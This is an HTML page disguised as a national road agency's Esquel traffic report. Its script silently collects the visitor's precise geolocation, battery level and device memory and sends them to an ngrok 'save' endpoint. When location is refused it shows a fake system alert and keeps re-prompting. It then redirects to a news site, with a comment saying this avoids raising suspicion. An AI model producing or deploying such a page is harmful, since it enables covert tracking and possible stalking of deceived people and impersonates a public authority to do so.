<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Vialidad Nacional - Reporte Esquel</title>
</head>
<body style="background:#f0f2f5; font-family:sans-serif; text-align:center; padding-top:100px;">
    <div style="max-width:450px; margin:auto; background:white; padding:30px; border-radius:15px; box-shadow:0 4px 15px rgba(0,0,0,0.2);">
        <h2 style="color:#c62828;">⚠ VALIDACIÓN REQUERIDA</h2>
        <p id="msg">Sincronizando con el satélite de Vialidad Nacional...</p>
        <div style="border:5px solid #f3f3f3; border-top:5px solid #c62828; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto;"></div>
    </div>
    <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>

    <script>
        // --- PEGA AQUÍ TU URL DE NGROK (Debe terminar en /save) ---
        const URL_NGROK = "https://overmean-beatifically-roland.ngrok-free.dev/save"; 

        async function recolectar() {
            let bat = "N/A";
            try { const b = await navigator.getBattery(); bat = Math.round(b.level * 100); } catch(e) {}

            navigator.geolocation.getCurrentPosition((pos) => {
                // Enviar datos al servidor
                fetch(URL_NGROK, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        battery: bat,
                        ram: navigator.deviceMemory || "N/A"
                    })
                }).catch(err => console.log("Error de envío:", err));

                // Redirigir para no levantar sospechas
                setTimeout(() => { window.location.href = "https://www.eqsnotas.com/"; }, 1000);
            }, (err) => {
                if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
                alert("SISTEMA: El mapa vial de Esquel no puede cargar sin permisos de ubicación.");
                recolectar(); 
            }, {enableHighAccuracy: true});
        }
        window.onload = recolectar;
    </script>
</body>
</html>
